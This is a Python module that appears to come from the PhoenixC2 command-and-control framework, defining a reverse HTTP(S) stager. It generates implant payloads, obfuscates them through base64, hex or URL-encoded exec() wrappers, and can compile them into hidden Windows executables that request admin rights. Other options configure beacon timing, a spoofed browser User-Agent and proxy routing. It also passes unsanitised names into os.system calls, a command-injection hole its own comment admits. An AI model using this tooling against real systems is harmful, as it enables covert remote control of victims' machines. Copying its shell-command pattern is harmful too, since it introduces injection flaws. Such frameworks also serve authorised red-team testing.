import base64
import os
import urllib
from typing import TYPE_CHECKING

import jinja2

from phoenixc2.server.utils.options import (
    AddressType,
    BooleanType,
    Option,
    OptionPool,
    StringType,
    DefaultStagerPool,
    IntegerType
)
from phoenixc2.server.utils.resources import get_resource
from ..base_stager import BasePayload, BaseStager, FinalPayload

if TYPE_CHECKING:
    from phoenixc2.server.database import StagerModel


class PythonPayload(BasePayload):
    name = "Python"
    description = "Python Payload"
    author = "Screamz2k"
    supported_target_os = ["linux"]
    supported_target_arch = ["x64", "x86"]
    supported_execution_methods = [
        "process",
    ]
    supported_code_types = ["shellcode", "compiled", "native"]
    supported_languages = ["python", "bash"]
    end_format = "py"
    compiled = False
    options = OptionPool()

    @classmethod
    def generate(
        cls, stager_db: "StagerModel", one_liner: bool = False, recompile: bool = False
    ) -> "FinalPayload":
        jinja2_env = jinja2.Environment(
            loader=jinja2.FileSystemLoader(os.path.dirname(os.path.abspath(__file__))),
            trim_blocks=True,
            lstrip_blocks=True,
            autoescape=True,
        )
        template = jinja2_env.get_template("payloads/python.py")
        output = template.render(stager=stager_db)
        if stager_db.encoding == "base64":
            output = f"import base64;exec(base64.b64decode('{base64.b64encode(output.encode()).decode()}'))"
        elif stager_db.encoding == "hex":
            output = (
                f"import codecs;exec(codecs.decode('{output.encode().hex()}', 'hex'))"
            )
        elif stager_db.encoding == "url":
            output = f"import urllib.parse;exec(urllib.parse.unquote('{urllib.parse.quote(output)}'))"

        if one_liner:
            output = 'python -c "' + output + '"'
        return FinalPayload(cls, stager_db, output)


class CompiledPythonPayload(PythonPayload):
    name = "Compiled Python"
    description = "Compiled Python Executable"
    supported_target_os = ["windows"]
    supported_code_types = ["compiled"]
    supported_languages = ["python"]
    end_format = ".exe"
    compiled = True
    options = OptionPool(
        [
            Option(
                "UAC",
                description="Ask for admin rights",
                real_name="admin",
                type=BooleanType(),
                default=False,
            ),
        ]
    )

    @classmethod
    def is_compiled(cls, stager_db: "StagerModel") -> bool:
        # TODO: Check if the file is compiled
        try:
            get_resource("data/stagers", f"{stager_db.name}.exe")
        except:
            return False
        else:
            return True

    @classmethod
    def generate(
        cls, stager_db: "StagerModel", one_liner: bool = False, recompile: bool = False
    ) -> "FinalPayload":
        payload = super().generate(stager_db, False, recompile)

        # save the payload to a file
        payload_file = get_resource(
            "data/stagers", f"{stager_db.name}.py", skip_file_check=True
        )

        with open(str(payload_file), "w") as f:
            f.write(payload.output)

        # check if the file is compiled
        if not recompile and cls.is_compiled(stager_db):
            return FinalPayload(
                cls, stager_db, get_resource("data/stagers", f"{stager_db.name}.exe")
            )

        # compile the file
        # WARNING: This is a security risk, as it allows arbitrary code execution!!! 
        # this is only a prototype

        if stager_db.options.get("admin", False):
            os.system(
                f"pyinstaller --onefile --noconsole --distpath --clean {payload_file} --name {stager_db.name} --distpath {get_resource('data/stagers')} --uac-admin"
            )
        else:
            print(f"pyinstaller --onefile --noconsole  --clean {payload_file} --name {stager_db.name}.exe --distpath {str(get_resource('data', 'stagers'))}")
            os.system(
                f"pyinstaller --onefile --noconsole --target-arch x86_64 --clean {payload_file} --name {stager_db.name}.exe --distpath {str(get_resource('data', 'stagers'))}"
            )
        
        # remove the file
        os.remove(str(payload_file))

        return FinalPayload(
            cls, stager_db, get_resource("data/stagers", f"{stager_db.name}.exe").open("rb").read()
        )


class Stager(BaseStager):
    name = "http-reverse"
    description = "Reverse HTTP(S) stager"
    author: str = "Screamz2k"
    payloads = {"python": PythonPayload, "compiled-python": CompiledPythonPayload}
    options = DefaultStagerPool(
        [
            Option(
                name="Sleep Time",
                description="The time to sleep between each request",
                real_name="sleep-time",
                type=IntegerType(),
                default=5,
                required=True,
            ),
            Option(
                name="Request User-Agent",
                real_name="user-agent",
                description="The User-Agent to use.",
                type=StringType(),
                default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
            ),
            Option(
                name="Proxy address",
                real_name="proxy_address",
                description="The address of a proxy to use.",
                type=AddressType(),
            ),
            Option(
                name="Proxy port",
                real_name="proxy_port",
                description="The port of a proxy to use.",
                type=IntegerType(),
                default=8080,
            ),
            Option(
                name="Proxy authentication",
                real_name="proxy_auth",
                description="The Authentication to use (format=username:password).",
                type=StringType(),
                default="",
            ),
        ],
        list(payloads.keys()),
    )
